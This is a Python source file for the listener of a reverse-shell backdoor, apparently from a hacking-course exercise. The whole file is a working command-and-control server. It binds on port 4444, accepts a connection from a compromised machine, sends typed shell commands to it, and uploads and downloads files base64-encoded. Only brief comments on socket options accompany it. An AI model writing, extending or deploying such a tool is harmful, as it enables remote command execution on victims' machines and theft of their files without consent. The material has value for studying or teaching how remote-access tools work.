import socket, json, base64


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("Waiting Connection..")
        self.connection, address = listener.accept()
        print("[+] Got Connection from " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024).decode('latin-1')
                return json.loads(json_data)

            except ValueError:
                continue


    def execute_remotely(self, command):
        if command[0] == "exit":
            self.reliable_send(command)
            self.connection.close()
            exit()
        self.reliable_send(command)
        return self.reliable_receive()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            decoded_content = base64.b64decode(content)
            file.write(decoded_content)
            return "[+] download successfull"

    def read_file(self, path):
        with open(path, "rb") as file:
            encoded_file = base64.b64encode(file.read())
            return encoded_file

    def run(self):
        while True:
            command = raw_input(">> ")
            command = command.split(" ")

            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)
                result = self.execute_remotely(command)
                if command[0] == "download" and "[-] Error " not in result:
                    result = self.write_file(command[1], result)
            except Exception:
                result = "[-] Error druing command execution."

            result = result.encode('ascii', 'ignore').decode('ascii')
            print(result)

my_listener = Listener("127.0.0.1",4444) #depends
my_listener.run()






#backlog is the number of connection that can be quequed before the system start refusing connections






# setsockoptions # we are changing an options that socket object have
# if out connection failed somehow reuse this socket to create connection again
# 1 means enable this option
# SOL SOCKET is the level
# and the REUSE is the options that we changed
